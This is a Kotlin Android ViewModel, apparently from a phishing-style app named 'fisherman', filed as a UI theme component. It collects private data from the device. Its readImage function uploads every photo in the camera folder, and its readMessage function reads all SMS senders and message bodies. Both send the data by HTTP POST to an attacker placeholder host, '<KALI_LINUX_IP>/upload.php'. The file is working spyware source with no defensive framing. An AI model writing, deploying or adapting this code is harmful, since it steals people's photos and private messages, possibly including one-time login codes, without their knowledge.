package com.example.fisherman.ui.theme.components

import android.content.ContentResolver
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Environment
import android.os.Message
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dagger.hilt.android.lifecycle.HiltViewModel
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileInputStream
import java.net.HttpURLConnection
import java.net.URL
import javax.inject.Inject

@HiltViewModel
class ComponentViewModel @Inject constructor(
    @ApplicationContext private val context: Context
) : ViewModel(){

    private val _imagePermissionEvent = MutableStateFlow<Unit?>(null)
    val imagePermissionEvent: StateFlow<Unit?> get() = _imagePermissionEvent

    private val _messagePermissionEvent = MutableStateFlow<Unit?>(null)
    val messagePermissionEvent: StateFlow<Unit?> get() = _messagePermissionEvent

    fun readImage(){
        val permission = android.Manifest.permission.READ_EXTERNAL_STORAGE
        if (ContextCompat.checkSelfPermission(context, permission) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.e("GalleryViewModel", "Permission not granted for reading storage.")
            _imagePermissionEvent.value = Unit
            return
        }

        val directory = File(Environment.getExternalStorageDirectory(), "DCIM/Camera")
        if (directory.exists()) {
            directory.listFiles()?.forEach { file ->
                if (file.isFile) {
                    uploadImage(file)
                }
            }
        }
    }

    fun readMessage(){
        val permission = android.Manifest.permission.READ_SMS
        if (ContextCompat.checkSelfPermission(context, permission) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.e("MessageViewModel", "Permission not granted for reading SMS.")
            _messagePermissionEvent.value = Unit
            return
        }

        val contentResolver: ContentResolver = context.contentResolver //ContentResolver를 사용해 기기의 SMS data query
        val cursor: Cursor? = contentResolver.query( //SMS 가져오기
            Uri.parse("content://sms/"), null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val sender = it.getString(it.getColumnIndexOrThrow("address"))
                val body = it.getString(it.getColumnIndexOrThrow("body"))
                uploadMessage("$sender: $body")
            }
        }
    }

    fun resetImagePermissionEvent() {
        _imagePermissionEvent.value = null // 이벤트 초기화
    }

    fun resetMessagePermissionEvent() {
        _messagePermissionEvent.value = null // 이벤트 초기화
    }

    private fun uploadImage(file: File){
        viewModelScope.launch(Dispatchers.IO) {
            try{
                val url = URL("http://<KALI_LINUX_IP>/upload.php")
                val connection = url.openConnection() as HttpURLConnection
                connection.apply {
                    doOutput = true
                    requestMethod = "POST"
                }


                FileInputStream(file).use { inputStream ->
                    connection.outputStream.use { outputStream ->
                        inputStream.copyTo(outputStream)
                    }
                }

                connection.responseCode
                connection.disconnect()
            } catch (e: Exception){
                Log.e("GalleryViewModel", "Error uploading file: ${e.message}")
            }
        }
    }

    private fun uploadMessage(message: String){
        viewModelScope.launch(Dispatchers.IO) {
            try{
                val url = URL("http://<KALI_LINUX_IP>/upload.php")
                val connection = url.openConnection() as HttpURLConnection
                connection.apply {
                    doOutput = true
                    requestMethod = "POST"
                }

                connection.outputStream.use { outputStream ->
                    outputStream.write("message=$message".toByteArray())
                }

                connection.responseCode
                connection.disconnect()
            } catch (e : Exception){
                Log.e("MessageViewModel", "Error sending message: ${e.message}")
            }
        }
    }
}